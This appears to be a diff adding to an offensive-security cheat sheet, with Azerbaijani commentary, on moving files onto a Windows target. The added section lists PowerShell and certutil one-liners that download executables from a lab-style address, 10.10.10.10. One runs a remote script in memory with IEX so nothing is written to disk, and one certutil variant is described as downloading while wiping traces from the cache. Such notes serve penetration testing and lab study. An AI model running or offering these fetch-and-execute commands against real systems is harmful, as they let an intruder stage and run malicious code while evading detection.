@@ -1,5 +1,29 @@
 # Windows 
 
+
+### PowerShell
+```powershell
+iwr -Uri "http://10.10.10.10/fayl.exe" -OutFile "C:\Temp\fayl.exe"
+```
+System.Net.WebClient (Köhnə versiyalar üçün):  
+`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/fayl.exe', 'C:\Temp\fayl.exe')"`
+
+Yaddaşda İcra Etmək (Faylı diskə yazmadan):  
+`powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"`
+
+
+### Certutil
+
+Standart Yükləmə:  
+`certutil -urlcache -f http://10.10.10.10/fayl.exe fayl.exe`
+  
+İzi silməklə yükləmə (Cache təmizləmək):  
+`certutil -urlcache -split -f http://10.10.10.10/fayl.exe fayl.exe`
+
+
+
+
+---
 ### Powershell
 
 ```powershell
